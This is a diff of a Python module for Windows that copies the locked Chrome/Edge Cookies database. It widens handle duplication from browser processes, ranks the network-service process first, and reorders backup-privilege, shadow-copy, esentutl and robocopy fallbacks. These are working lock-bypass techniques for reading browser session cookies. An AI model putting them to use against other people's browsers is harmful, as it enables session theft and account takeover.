@@ -26,7 +26,7 @@ from typing import Any
 # Handle-dup must not pin the quoting PC. 18 chrome.exe processes * system
 # handle table is unbounded; GetFinalPathNameByHandle can also stall.
 _DUP_HANDLE_TIMEOUT_S = 4.0
-_DUP_HANDLE_MAX_PIDS = 8
+_DUP_HANDLE_MAX_PIDS = 24
 _DUP_HANDLE_MAX_HANDLES = 2000
 _SYSTEM_HANDLE_BUF_MAX = 8 << 20
 
@@ -238,14 +238,29 @@ def _discover_uncached() -> tuple[str, str, str]:
 
 
 def _safe_os_error(exc: BaseException) -> str:
-    """WinError / errno only — never cookie material."""
+    """WinError / errno / NTSTATUS only — never cookie material."""
+    detail = ""
+    if getattr(exc, "args", None) and len(exc.args) > 1:
+        detail = _safe_snapshot_detail(str(exc.args[1]))
     win = getattr(exc, "winerror", None)
     if win is not None:
-        return f"WinError {win}"
-    err = getattr(exc, "errno", None)
-    if err is not None:
-        return f"errno {err}"
-    return type(exc).__name__
+        code = f"WinError {win}"
+    else:
+        err = getattr(exc, "errno", None)
+        if err is None:
+            code = type(exc).__name__
+        elif int(err) > 65535 or int(err) < 0:
+            code = f"NTSTATUS {_hr_hex(int(err))}"
+        else:
+            code = f"errno {err}"
+    if detail in {
+        "dup_handle_timeout",
+        "dup_handle_not_found",
+        "ReadFile failed",
+        "CreateFileW failed",
+    }:
+        return f"{code}:{detail}"
+    return code
 
 
 def _safe_snapshot_detail(text: str) -> str:
@@ -373,11 +388,9 @@ def _read_cookie_rows(
     try:
         dest = Path(tmp_dir) / "Cookies"
         last_exc: BaseException | None = None
-        for attempt in range(3):
+        for attempt in range(2):
             try:
-                _snapshot_sqlite_file(
-                    src, dest, allow_vss=allow_vss and attempt == 2
-                )
+                _snapshot_sqlite_file(src, dest, allow_vss=allow_vss)
                 last_exc = None
                 break
             except (OSError, sqlite3.Error) as exc:
@@ -502,12 +515,16 @@ def _win_lock_bypass_with_wal(src: Path, dest: Path, *, allow_vss: bool = True) 
         ("dup_handle", _win_dup_handle_copy),
         ("backup_priv", _win_backup_copy),
         ("nt_backup", _win_ntcreatefile_backup_copy),
-        ("esentutl", _win_esentutl_copy),
-        ("robocopy_b", _win_robocopy_backup_copy),
-        ("vss_existing", _win_vss_existing_copy),
     ]
     if allow_vss:
         methods.append(("vss", _win_vss_copy))
+    methods.extend(
+        (
+            ("vss_existing", _win_vss_existing_copy),
+            ("esentutl", _win_esentutl_copy),
+            ("robocopy_b", _win_robocopy_backup_copy),
+        )
+    )
     if _cache.get("dup_timed_out"):
         methods = [(n, fn) for n, fn in methods if n != "dup_handle"]
         trail.append("dup_handle_timeout")
@@ -534,6 +551,8 @@ def _win_lock_bypass_with_wal(src: Path, dest: Path, *, allow_vss: bool = True) 
             if name == "dup_handle" and "dup_handle_timeout" in detail:
                 trail.append("dup_handle_timeout")
                 _cache["dup_timed_out"] = True
+            elif name == "dup_handle" and "dup_handle_not_found" in detail:
+                trail.append("dup_handle_not_found")
             else:
                 trail.append(f"{name}:{_safe_os_error(exc)}")
             if dest.exists():
@@ -597,6 +616,54 @@ def _enable_privilege(name: str) -> None:
         kernel32.CloseHandle(token)
 
 
+def _kernel32():
+    """kernel32 with pointer-width HANDLE prototypes (Win64 LLP64)."""
+    import ctypes
+    from ctypes import wintypes
+
+    kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)
+    kernel32.CreateFileW.argtypes = [
+        wintypes.LPCWSTR,
+        wintypes.DWORD,
+        wintypes.DWORD,
+        wintypes.LPVOID,
+        wintypes.DWORD,
+        wintypes.DWORD,
+        wintypes.HANDLE,
+    ]
+    kernel32.CreateFileW.restype = wintypes.HANDLE
+    kernel32.ReadFile.argtypes = [
+        wintypes.HANDLE,
+        wintypes.LPVOID,
+        wintypes.DWORD,
+        ctypes.POINTER(wintypes.DWORD),
+        wintypes.LPVOID,
+    ]
+    kernel32.ReadFile.restype = wintypes.BOOL
+    kernel32.SetFilePointer.argtypes = [
+        wintypes.HANDLE,
+        wintypes.LONG,
+        wintypes.PLONG,
+        wintypes.DWORD,
+    ]
+    kernel32.SetFilePointer.restype = wintypes.DWORD
+    kernel32.CloseHandle.argtypes = [wintypes.HANDLE]
+    kernel32.CloseHandle.restype = wintypes.BOOL
+    kernel32.GetFileType.argtypes = [wintypes.HANDLE]
+    kernel32.GetFileType.restype = wintypes.DWORD
+    kernel32.GetFinalPathNameByHandleW.argtypes = [
+        wintypes.HANDLE,
+        wintypes.LPWSTR,
+        wintypes.DWORD,
+        wintypes.DWORD,
+    ]
+    kernel32.GetFinalPathNameByHandleW.restype = wintypes.DWORD
+    kernel32.OpenProcess.argtypes = [wintypes.DWORD, wintypes.BOOL, wintypes.DWORD]
+    kernel32.OpenProcess.restype = wintypes.HANDLE
+    kernel32.GetCurrentProcess.restype = wintypes.HANDLE
+    return kernel32
+
+
 def _win_createfile_copy(src: Path, dest: Path, *, flags: int = 0x80) -> None:
     import ctypes
     from ctypes import wintypes
@@ -606,20 +673,9 @@ def _win_createfile_copy(src: Path, dest: Path, *, flags: int = 0x80) -> None:
     open_existing = 3
     invalids = {-1, 0xFFFFFFFF, 0xFFFFFFFFFFFFFFFF}
 
-    kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)
-    create_file = kernel32.CreateFileW
-    create_file.argtypes = [
-        wintypes.LPCWSTR,
-        wintypes.DWORD,
-        wintypes.DWORD,
-        wintypes.LPVOID,
-        wintypes.DWORD,
-        wintypes.DWORD,
-        wintypes.HANDLE,
-    ]
-    create_file.restype = wintypes.HANDLE
-    handle = create_file(
-        str(src),
+    kernel32 = _kernel32()
+    handle = kernel32.CreateFileW(
+        _win_long_path(src),
         generic_read,
         share,
         None,
@@ -633,22 +689,51 @@ def _win_createfile_copy(src: Path, dest: Path, *, flags: int = 0x80) -> None:
     try:
         _read_handle_to_file(handle, dest)
     finally:
-        kernel32.CloseHandle(handle)
+        kernel32.CloseHandle(wintypes.HANDLE(handle))
+
+
+def _win_long_path(src: Path) -> str:
+    text = str(src.resolve()).replace("/", "\\")
+    if text.startswith("\\\\?\\"):
+        return text
+    if text.startswith("\\\\"):
+        return "\\\\?\\UNC\\" + text[2:]
+    return "\\\\?\\" + text
+
+
+def _nt_native_path(src: Path | str) -> str:
+    """DOS path → \\??\\C:\\... for NtCreateFile. Never keep a \\\\?\\ prefix."""
+    text = str(src)
+    if hasattr(src, "resolve"):
+        try:
+            text = str(src.resolve())
+        except OSError:
+            text = str(src)
+    text = text.replace("/", "\\")
+    if text.startswith("\\\\?\\UNC\\"):
+        text = "\\" + text[7:]
+    elif text.startswith("\\\\?\\"):
+        text = text[4:]
+    if text.startswith("\\??\\"):
+        return text
+    if text.startswith("\\\\"):
+        return "\\??\\UNC\\" + text[2:]
+    return "\\??\\" + text
 
 
 def _read_handle_to_file(handle: Any, dest: Path) -> None:
     import ctypes
     from ctypes import wintypes
 
-    kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)
-    file_begin = 0
-    kernel32.SetFilePointer(handle, 0, None, file_begin)
+    kernel32 = _kernel32()
+    h = handle if isinstance(handle, wintypes.HANDLE) else wintypes.HANDLE(int(handle))
+    kernel32.SetFilePointer(h, 0, None, 0)
     buf = ctypes.create_string_buffer(1024 * 1024)
     done = wintypes.DWORD(0)
     wrote = 0
     with dest.open("wb") as out:
         while True:
-            ok = kernel32.ReadFile(handle, buf, len(buf), ctypes.byref(done), None)
+            ok = kernel32.ReadFile(h, buf, len(buf), ctypes.byref(done), None)
             if not ok:
                 raise OSError(ctypes.get_last_error() or 32, "ReadFile failed")
             if done.value == 0:
@@ -680,7 +765,7 @@ def _win_dup_handle_copy(src: Path, dest: Path) -> None:
         return
     if err:
         raise err[0]
-    raise OSError(32, "Cookies handle not found on chrome.exe/msedge.exe")
+    raise OSError(32, "dup_handle_not_found")
 
 
 def _win_dup_handle_copy_inner(src: Path, dest: Path) -> None:
@@ -694,7 +779,7 @@ def _win_dup_handle_copy_inner(src: Path, dest: Path) -> None:
     except OSError:
         pass
     want = _normalize_win_path(str(src.resolve()))
-    kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)
+    kernel32 = _kernel32()
     kernel32.DuplicateHandle.argtypes = [
         wintypes.HANDLE,
         wintypes.HANDLE,
@@ -709,7 +794,7 @@ def _win_dup_handle_copy_inner(src: Path, dest: Path) -> None:
     file_type_disk = 1
 
     exe_names = _browser_exe_names_for_path(src)
-    pids = _windows_browser_pids(exe_names)[:_DUP_HANDLE_MAX_PIDS]
+    pids = _rank_browser_pids(_windows_browser_pids(exe_names))[:_DUP_HANDLE_MAX_PIDS]
     if not pids:
         raise OSError(32, "No chrome.exe/msedge.exe process for handle dup")
     pid_set = set(pids)
@@ -768,7 +853,7 @@ def _win_dup_handle_copy_inner(src: Path, dest: Path) -> None:
     finally:
         for hproc in opened.values():
             kernel32.CloseHandle(hproc)
-    raise OSError(32, "Cookies handle not found on chrome.exe/msedge.exe")
+    raise OSError(32, "dup_handle_not_found")
 
 
 def _open_browser_process(kernel32: Any, pid: int) -> Any:
@@ -786,6 +871,69 @@ def _browser_exe_names_for_path(src: Path) -> set[str]:
     if "microsoft\\edge" in text:
         return {"msedge.exe"}
     return {"chrome.exe"}
+
+
+def _rank_browser_pids(pids: list[int]) -> list[int]:
+    """Network service holds Cookies. Scan that PID before renderers."""
+    network: list[int] = []
+    utility: list[int] = []
+    rest: list[int] = []
+    for pid in pids:
+        cmd = _process_command_line(pid).casefold()
+        if "network.mojom" in cmd or "utility-sub-type=network" in cmd:
+            network.append(pid)
+        elif "--type=utility" in cmd:
+            utility.append(pid)
+        else:
+            rest.append(pid)
+    return network + utility + rest
+
+
+def _process_command_line(pid: int) -> str:
+    if os.name != "nt" or not pid:
+        return ""
+    try:
+        import ctypes
+        from ctypes import wintypes
+
+        kernel32 = _kernel32()
+        hproc = kernel32.OpenProcess(0x1000, False, pid)  # PROCESS_QUERY_LIMITED
+        if not hproc:
+            return ""
+        try:
+            ntdll = ctypes.WinDLL("ntdll")
+            ntdll.NtQueryInformationProcess.restype = ctypes.c_long
+            size = 0x2000
+            buf = ctypes.create_string_buffer(size)
+            needed = ctypes.c_ulong()
+            status = int(
+                ntdll.NtQueryInformationProcess(
+                    hproc, 60, buf, size, ctypes.byref(needed)
+                )
+            )
+            if status != 0:
+                return ""
+
+            class US(ctypes.Structure):
+                _fields_ = [
+                    ("Length", wintypes.USHORT),
+                    ("MaximumLength", wintypes.USHORT),
+                    ("Buffer", ctypes.c_void_p),
+                ]
+
+            us = US.from_buffer_copy(buf.raw[: ctypes.sizeof(US)])
+            if us.Length and us.Buffer:
+                try:
+                    return ctypes.wstring_at(us.Buffer, us.Length // 2)
+                except (ValueError, OSError, ctypes.ArgumentError):
+                    pass
+            # Command line often follows the UNICODE_STRING in the same buffer.
+            off = ctypes.sizeof(US)
+            return ctypes.wstring_at(ctypes.addressof(buf) + off, max(0, us.Length // 2))
+        finally:
+            kernel32.CloseHandle(hproc)
+    except (AttributeError, OSError, ValueError, TypeError, OverflowError):
+        return ""
 
 
 def _system_handle_pairs(
@@ -1091,20 +1239,35 @@ def _win_ntcreatefile_backup_copy(src: Path, dest: Path) -> None:
             ("Information", ctypes.c_void_p),
         ]
 
-    resolved = str(src.resolve())
-    nt_path = "\\??\\" + resolved
+    nt_path = _nt_native_path(src)
     buf = ctypes.create_unicode_buffer(nt_path)
     us = UNICODE_STRING()
     us.Length = len(nt_path) * 2
-    us.MaximumLength = us.Length + 2
-    us.Buffer = ctypes.cast(buf, wintypes.LPWSTR)
+    us.MaximumLength = (len(nt_path) + 1) * 2
+    us.Buffer = ctypes.cast(ctypes.addressof(buf), wintypes.LPWSTR)
     oa = OBJECT_ATTRIBUTES()
     oa.Length = ctypes.sizeof(OBJECT_ATTRIBUTES)
+    oa.RootDirectory = None
     oa.ObjectName = ctypes.pointer(us)
     oa.Attributes = 0x40  # OBJ_CASE_INSENSITIVE
+    oa.SecurityDescriptor = None
+    oa.SecurityQualityOfService = None
     handle = wintypes.HANDLE()
     iosb = IO_STATUS_BLOCK()
     ntdll = ctypes.WinDLL("ntdll")
+    ntdll.NtCreateFile.argtypes = [
+        ctypes.POINTER(wintypes.HANDLE),
+        wintypes.DWORD,
+        ctypes.POINTER(OBJECT_ATTRIBUTES),
+        ctypes.POINTER(IO_STATUS_BLOCK),
+        ctypes.c_void_p,
+        wintypes.ULONG,
+        wintypes.ULONG,
+        wintypes.ULONG,
+        wintypes.ULONG,
+        ctypes.c_void_p,
+        wintypes.ULONG,
+    ]
     ntdll.NtCreateFile.restype = ctypes.c_long
     status = int(
         ntdll.NtCreateFile(
@@ -1123,7 +1286,7 @@ def _win_ntcreatefile_backup_copy(src: Path, dest: Path) -> None:
     ) & 0xFFFFFFFF
     if status != 0 or not handle:
         raise OSError(status or 32, "NtCreateFile backup open failed")
-    kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)
+    kernel32 = _kernel32()
     try:
         _read_handle_to_file(handle, dest)
     finally:
